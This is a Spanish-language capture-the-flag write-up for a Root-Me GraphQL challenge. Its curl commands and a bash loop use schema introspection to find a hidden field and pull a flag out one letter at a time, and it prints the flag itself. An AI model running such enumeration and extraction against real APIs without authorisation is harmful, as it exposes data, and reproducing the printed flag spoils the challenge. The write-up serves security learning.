---
title: "Informe Técnico: Vulnerabilidad de Introspección en GraphQL"
author: "Mobile Security Auditor"
date: "11 de enero de 2026"
geometry: margin=2cm
output: pdf_document
---

Análisis Inicial
Al inspeccionar el código fuente de la página, encontramos un script encargado de obtener los datos de los cohetes. Este script revela el endpoint de la API: /rocketql.

```JavaScript

fetch('/rocketql', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ query: '{ rockets(country: "' + country + '") { name, country, is_active } }' })
})
```
Enumeración (Introspección)
Para verificar si el servidor tiene habilitada la introspección, lanzamos una consulta al esquema para listar todos los tipos y campos disponibles.

```bash

curl -s -X POST -H "Content-Type: application/json" \
-d '{"query": "{ __schema { queryType { fields { name args { name type { name kind } } } } } }"}' \
http://challenge01.root-me.org:59077/rocketql
```
Resultado relevante: Aparte del objeto rockets, encontramos un objeto sospechoso llamado IAmNotHere que requiere un argumento obligatorio llamado ```very_long_id```
 de tipo Int.

Identificación de Subcampos
Al intentar consultar IAmNotHere, el servidor nos indica que debemos especificar qué campos queremos recibir. Consultamos nuevamente el esquema para ver la estructura interna de ese tipo:

```bash

curl -s -X POST -H "Content-Type: application/json" \
-d '{"query": "{ __type(name: \"IAmNotHere\") { fields { name } } }"}' \
http://challenge01.root-me.org:59077/rocketql
```
Descubrimos que contiene el campo:``` very_long_value.
```
Explotación y Exfiltración
Al consultar el primer ID ```(very_long_id: 1),
```
 notamos que el servidor devuelve una sola letra. Esto indica que la flag está fragmentada a través de múltiples registros.

Para automatizar la extracción, ejecutamos un bucle en Bash que recorre los IDs del 1 al 30, extrae el valor y lo concatena:

```bash

for i in {1..30}; do 
  curl -s -X POST -H "Content-Type: application/json" \
  -d "{\"query\": \"{ IAmNotHere(very_long_id: $i) { very_long_value } }\"}" \
  http://challenge01.root-me.org:59077/rocketql | grep -oP 'value":"\K[^"]+'; 
done | tr -d '\n'
Resultado final: nothingherelolCongratulations, you can use this flag: RM{1ntr0sp3ct1On_1s_us3ful}
```

